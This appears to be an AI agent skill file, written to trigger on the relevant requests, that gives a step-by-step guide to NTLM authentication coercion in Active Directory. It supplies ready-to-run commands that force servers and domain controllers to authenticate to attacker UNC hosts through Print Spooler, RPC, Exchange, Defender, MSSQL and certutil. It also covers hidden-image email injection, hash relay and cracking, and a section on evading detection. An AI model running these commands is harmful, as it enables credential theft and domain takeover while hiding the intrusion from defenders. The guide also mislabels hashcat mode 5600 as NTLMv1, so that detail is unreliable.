---
name: windows-ntlm-coercion
description: Guide for NTLM authentication coercion attacks in Active Directory environments. Use this skill whenever the user needs to force Windows systems to authenticate to an attacker-controlled host, capture NTLM hashes, or perform relay attacks. Trigger on mentions of: authentication coercion, NTLM relay, Print Spooler abuse, RPC coercion, PetitPotam, MS-EVEN, MS-EFSR, PrivExchange, or any scenario where you need to make a Windows system authenticate to a specific target.
---

# Windows NTLM Authentication Coercion

This skill provides methodology for forcing Windows systems to authenticate to attacker-controlled hosts, enabling NTLM hash capture and relay attacks in Active Directory environments.

## ⚠️ Authorization Required

**Only use these techniques on systems you own or have explicit written authorization to test.** Unauthorized use is illegal and unethical.

## When to Use This Skill

Use this skill when:
- You need to capture NTLM hashes from Windows systems
- You want to perform NTLM relay attacks
- You're testing Active Directory security controls
- You need to coerce authentication from specific targets (DCs, servers, workstations)
- You're assessing Print Spooler, RPC, or Exchange vulnerabilities

## Core Concept

NTLM authentication coercion tricks Windows into initiating an authentication request to a host you control. When the target authenticates, you can:
1. **Capture the NTLM hash** (for offline cracking)
2. **Relay the authentication** to another service (for privilege escalation)
3. **Extract tickets** (if unconstrained delegation is configured)

---

## Method 1: Print Spooler Service Abuse

### Prerequisites
- Print Spooler service enabled on target
- Valid domain credentials
- Network access to target

### Step 1: Enumerate Windows Servers

```powershell
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```

### Step 2: Check for Spooler Service

**Option A: PowerShell (Windows)**
```powershell
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

**Option B: rpcdump.py (Linux)**
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

### Step 3: Trigger Authentication

**Windows (SpoolSample):**
```bash
SpoolSample.exe <TARGET> <RESPONDER_IP>
```

**Linux (dementor.py):**
```bash
python dementor.py -d domain -u username -p password <RESPONDER_IP> <TARGET>
```

**Linux (printerbug.py):**
```bash
printerbug.py 'domain/username:password'@<Printer_IP> <RESPONDER_IP>
```

### Combining with Unconstrained Delegation

If you've compromised a host with unconstrained delegation:
1. Force the printer to authenticate to that host
2. The printer's computer account TGT gets cached in memory
3. Extract the ticket and use Pass-the-Ticket

---

## Method 2: RPC Coercion

### Coercion Matrix

| Protocol | Pipe | Interface UUID | Opnums | Tool |
|----------|------|----------------|--------|------|
| MS-RPRN | \\PIPE\\spoolss | 12345678-1234-abcd-ef00-0123456789ab | 62, 65 | PrinterBug |
| MS-PAR | \\PIPE\\spoolss | 76f03f96-cdfd-44fc-a22c-64950a001209 | 0 | - |
| MS-EFSR | \\PIPE\\efsrpc | c681d488-d850-11d0-8c52-00c04fd90f7e | 0,4,5,6,7,12,13,15,16 | PetitPotam |
| MS-DFSNM | \\PIPE\\netdfs | 4fc742e0-4a10-11cf-8273-00aa004ae673 | 12, 13 | DFSCoerce |
| MS-FSRVP | \\PIPE\\FssagentRpc | a8e0653c-2744-4389-a61d-7373df8b2292 | 8, 9 | ShadowCoerce |
| MS-EVEN | \\PIPE\\even | 82273fdc-e32a-18c3-3f78-827929dc23ea | 9 | CheeseOunce |

### MS-EVEN: ElfrOpenBELW (Opnum 9)

**Most effective for Tier 0 assets (DCs, RODCs, Citrix)**

- **Interface:** MS-EVEN over \\PIPE\\even
- **Call:** `ElfrOpenBELW(UNCServerName, BackupFileName, MajorVersion, MinorVersion, LogHandle)`
- **Effect:** Target attempts to open backup log path and authenticates to attacker UNC
- **Use case:** Coerce DCs to emit NetNTLM, relay to AD CS endpoints (ESC8/ESC11)

---

## Method 3: PrivExchange (Exchange Server)

### Overview

Exchange Server's `PushSubscription` feature allows any domain user with a mailbox to force the Exchange server to authenticate to any client-provided host over HTTP.

### Impact

- Exchange service runs as **SYSTEM**
- Has **WriteDacl privileges** on domain (pre-2019 CU)
- Can relay to LDAP and extract **NTDS.dit**
- Grants **Domain Admin** access with any authenticated user account

### Execution

```bash
# Use PrivExchange tool
python privexchange.py -u username -p password -t <TARGET_IP> -d domain
```

---

## Method 4: Inside Windows Coercion

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR_IP>\file.txt
```

### MSSQL Coercion

**Using xp_dirtree:**
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

**Using MSSQLPwner:**
```bash
# Relay to specific server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Relay using chain ID
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Local server relay
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

### Certutil Coercion

```bash
certutil.exe -syncwithWU \\127.0.0.1\share
```

---

## Method 5: HTML Injection

### Via Email

Send email with embedded image to target user:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

When opened, the user's browser attempts to authenticate to the UNC path.

### Via MitM

Inject into web pages the user visits:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

---

## Post-Exploitation: Cracking NTLMv1

### Capture Setup

Set Responder challenge to weak value:
```bash
# In Responder configuration
challenge = "1122334455667788"
```

### Cracking

Use hashcat or john:
```bash
# Hashcat (mode 5600 for NTLMv1)
hashcat -m 5600 ntlm_hashes.txt wordlist.txt

# John the Ripper
john --format=ntlmv1 ntlm_hashes.txt
```

---

## Tool References

| Tool | Purpose | Repository |
|------|---------|------------|
| PetitPotam | MS-EFSR coercion | https://github.com/topotam/PetitPotam |
| DFSCoerce | MS-DFSNM coercion | https://github.com/Wh04m1001/DFSCoerce |
| ShadowCoerce | MS-FSRVP coercion | https://github.com/ShutdownRepo/ShadowCoerce |
| Coercer | RPC coercion | https://github.com/p0dalirius/Coercer |
| MSSQLPwner | MSSQL relay | https://github.com/ScorpionesLabs/MSSqlPwner |
| SharpSystemTriggers | C# auth triggers | https://github.com/cube0x0/SharpSystemTriggers |
| krbrelayx | Relay attacks | https://github.com/dirkjanm/krbrelayx |

---

## Best Practices

1. **Start with MS-EVEN** - Most reliable for DCs and Tier 0
2. **Use multiple methods** - Different systems have different services enabled
3. **Check for unconstrained delegation** - Can extract TGTs from coerced authentications
4. **Combine with AD CS** - Relay to ESC8/ESC11 for certificate enrollment
5. **Document findings** - Track which methods work on which systems

---

## Detection Evasion

- Use legitimate-looking UNC paths
- Time attacks during business hours
- Avoid rapid-fire attempts that trigger alerts
- Consider using existing tools already on the network

---

## References

- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
